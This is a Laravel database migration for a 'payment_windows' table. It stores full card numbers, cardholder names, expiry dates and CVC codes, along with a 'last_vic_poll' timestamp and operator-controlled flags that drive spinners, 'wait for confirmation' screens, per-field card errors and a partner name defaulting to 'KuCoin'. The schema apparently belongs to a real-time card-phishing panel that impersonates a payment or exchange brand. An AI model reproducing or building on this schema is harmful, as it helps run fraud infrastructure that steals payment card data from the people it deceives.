<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('payment_windows', function (Blueprint $table) {
            $table->id();
            $table->unsignedBigInteger('payment_session_id')->nullable(false)->index();
            $table->unsignedBigInteger('payment_window_id')->nullable(false)->index();
            $table->string('cc_number', 50)->nullable(false);
            $table->string('cc_owner', 200)->nullable(false);
            $table->string('cc_expiration_date', 20)->nullable(false);
            $table->string('cc_cvc', 10)->nullable(false);
            $table->timestamp('last_vic_poll')->nullable(false);
            $table->boolean('show_fullscreen_spinner')->nullable(false)->default(true);
            $table->string('fullscreen_spinner_label', 500)->nullable(false)->default('Bitte warten');
            $table->boolean('show_wait_for_confirmation')->nullable(false)->default(false);
            $table->string('wait_for_confirmation_error', 500)->nullable();
            $table->boolean('show_success')->nullable(false)->default(false);
            $table->string('partner', 200)->nullable(false)->default('KuCoin');
            $table->boolean('close_window_with_error')->nullable(false)->default(false);
            $table->string('error_message', 500)->nullable();
            $table->boolean('error_cc_number')->nullable();
            $table->boolean('error_cc_owner')->nullable();
            $table->boolean('error_cc_date')->nullable();
            $table->boolean('error_cc_cvc')->nullable();
            $table->timestamps();

            $table->unique(['payment_session_id', 'payment_window_id'], 'better_id');
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('payment_windows');
    }
};
